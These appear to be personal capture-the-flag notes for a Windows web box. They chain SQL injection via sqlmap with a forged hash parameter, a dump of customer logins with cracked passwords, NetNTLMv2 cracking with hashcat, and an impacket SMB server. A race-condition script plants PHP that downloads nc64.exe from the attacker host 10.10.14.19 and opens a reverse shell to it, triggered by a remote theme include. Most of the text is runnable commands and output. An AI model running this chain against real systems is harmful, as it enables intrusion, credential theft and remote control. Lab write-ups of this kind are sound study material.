# Web App

## /products-ajax.php 

![[Pasted image 20210715162618.png]]c


```bash
curl http://10.10.10.231/products-ajax.php
```

```php
<!-- [8] Undefined index: order
On line 6 in file C:\inetpub\wwwroot\products-ajax.php
  1 |   // SECURE_PARAM_SALT needs to be defined prior including functions.php 
  2 |   define('SECURE_PARAM_SALT','hie0shah6ooNoim'); 
  3 |   include('functions.php'); 
  4 |   include('db-config.php'); 
  5 |   if ( !$_GET['order'] || !$_GET['h'] ) {                <<<<< Error encountered in this line.
  6 |     // Set the response code to 500 
  7 |     http_response_code(500); 
  8 |     // and die(). Someone fiddled with the parameters. 
  9 |     die('Parameter missing or malformed.'); 
 10 |   } 
 11 |  
// -->
Parameter missing or malformed.
```


# SQL Injection


```bash
sqlmap -u "http://10.10.10.231/products-ajax.php?order=id+desc&h=a1b30d31d344a5a4e41e8496ccbdd26b" --eval="import hashlib;h=hashlib.md5(('hie0shah6ooNoim'+order).encode()).hexdigest()" --batch -dbs
```

```bash
available databases [3]:
[*] cleaner
[*] information_schema
[*] test
```

```bash
Database: cleaner
[3 tables]
+-----------+
| customers |
| licenses  |
| products  |
+-----------+
``` 


```bash
+----+------------------------------+----------------------------------------------+----------------------+
| id | login                        | password                                     | customer_name        |
+----+------------------------------+----------------------------------------------+----------------------+
| 1  | vikki.solomon@throwaway.mail | 7c6a180b36896a0a8c02787eeafb0e4c (password1) | Vikki Solomon        |
| 2  | nstone@trashbin.mail         | 6cb75f652a9b52798eb6cf2201057c73 (password2) | Neave Stone          |
| 3  | bmceachern7@discovery.moc    | e10adc3949ba59abbe56e057f20f883e (123456)    | Bertie McEachern     |
| 4  | jkleiser8@google.com.xy      | 827ccb0eea8a706c4c34a16891f84e7b (12345)     | Jordana Kleiser      |
| 5  | mchasemore9@sitemeter.moc    | 25f9e794323b453885f5181f1b624d0b (123456789) | Mariellen Chasemore  |
| 6  | gdornina@marriott.moc        | 5f4dcc3b5aa765d61d8327deb882cf99 (password)  | Gwyneth Dornin       |
| 7  | itootellb@forbes.moc         | f25a2fc72690b780b2a14e140ef6a9e0 (iloveyou)  | Israel Tootell       |
| 8  | kmanghamc@state.tx.su        | 8afa847f50a716e64932d995c8e7435a (princess)  | Karon Mangham        |
| 9  | jblinded@bing.moc            | fcea920f7412b5da7be0cf42b8c93759 (1234567)   | Janifer Blinde       |
| 10 | llenchenkoe@macromedia.moc   | f806fc5a2a0d5ba2471600758452799c (rockyou)   | Laurens Lenchenko    |
| 11 | aaustinf@booking.moc         | 25d55ad283aa400af464c76d713c07ad (12345678)  | Andreana Austin      |
| 12 | afeldmesserg@ameblo.pj       | e99a18c428cb38d5f260853678922e03 (abc123)    | Arnold Feldmesser    |
| 13 | ahuntarh@seattletimes.moc    | fc63f87c08d505264caba37514cd0cfd (nicole)    | Adella Huntar        |
| 14 | talelsandrovichi@tamu.ude    | aa47f8215c6f30a0dcdb2a36a9f4168e (daniel)    | Trudi Alelsandrovich |
| 15 | ishayj@dmoz.gro              | 67881381dbc68d4761230131ae0008f7 (babygirl)  | Ivy Shay             |
| 16 | acallabyk@un.gro             | d0763edaa9d9bd2a9516280e9044d885 (monkey)    | Alys Callaby         |
| 17 | daeryl@about.you             | 061fba5bdfc076bb7362616668de87c8 (lovely)    | Dorena Aery          |
| 18 | aalekseicikm@skyrock.moc     | aae039d6aa239cfc121357a825210fa3 (jessica)   | Amble Alekseicik     |
| 19 | lginmann@lycos.moc           | c33367701511b4f6020ec61ded352059 (654321)    | Lin Ginman           |
| 20 | lgiorioo@ow.lic              | 0acf4539a14b3aa27deeb4cbdf6e989f (michael)   | Letty Giorio         |
| 21 | lbyshp@wired.moc             | adff44c5102fca279fce7559abf66fee (ashley)    | Lazarus Bysh         |
| 22 | bklewerq@yelp.moc            | d8578edf8458ce06fbc5bb76a58c5ca4 (qwerty)    | Bud Klewer           |
| 23 | wstrettellr@senate.gov       | 96e79218965eb72c92a549dd5a330112 (111111)    | Woodrow Strettell    |
| 24 | lodorans@kickstarter.moc     | edbd0effac3fcc98e725920a512881e0 (iloveu)    | Lila O Doran         |
| 25 | bpfeffelt@artisteer.moc      | 670b14728ad9902aecba32e22fa4f6bd (000000)    | Bibbie Pfeffel       |
| 26 | lgrimsdellu@abc.net.uvw      | 2345f10bb948c5665ef91f6773b3e455 (michelle)  | Luce Grimsdell       |
| 27 | lpealingv@goo.goo            | f78f2477e949bee2d12a2c540fb6084f (tigger)    | Lyle Pealing         |
| 28 | krussenw@mit.ude             | 0571749e2ac330a7455809c6b0e7af90 (sunshine)  | Kimmy Russen         |
| 29 | meastmondx@businessweek.moc  | c378985d629e99a4e86213db0cd5e70d (chocolate) | Meg Eastmond         |
+----+------------------------------+----------------------------------------------+----------------------+
```


# Login

![[Pasted image 20210715190506.png]]

# RFI on Theme

![[Pasted image 20210715190536.png]]

![[Pasted image 20210715190552.png]]


# Cracking the password
```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -O

WEB::PROPER:aaaaaaaaaaaaaaaa:40c1f0c350cf4bedf589adaaa1c7c3be:0101000000000000800d2fb1a379d701febe4c627909d86c00000000010010006700690075004700460051004900610003001000670069007500470046005100490061000200100059007800580064004a006500750050000400100059007800580064004a0065007500500007000800800d2fb1a379d701060004000200000008003000300000000000000000000000002000000c1320ba2b35b93233e065fd654f8f70734b990c3153a5b976de991ffefaf52d0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310039000000000000000000:charlotte123!
```


# Start the server with credentials

```bash
impacket-smbserver -ip 10.10.14.19 -username web -password charlotte123! -smb2support smb smb  
```


# Race Condition on File Validation

## Copy nc

```bash
#!/bin/bash

while true; do
	echo -n '<?php echo("Im here"); system("cmd /c powershell iwr http://10.10.14.19/nc64.exe -OutFile \Windows\System32\spool\drivers\color\pwn.exe"); ?>' > header.inc
done
```

## Run NetCat
```bash
#!/bin/bash

while true; do
	echo -n '<?php echo("Im here"); system("cmd /c start \Windows\System32\spool\drivers\color\pwn.exe -e cmd 10.10.14.19 4444"); ?>' > header.inc
done
```

# Shell
```http
GET /licenses/licenses.php?theme=//10.10.14.19/smb&h=e2647b78e1f91639a369055f5f0fd0c6 HTTP/1.1
Host: 10.10.10.231
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=sbrm782i5qvaaialgeam8il94c
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```
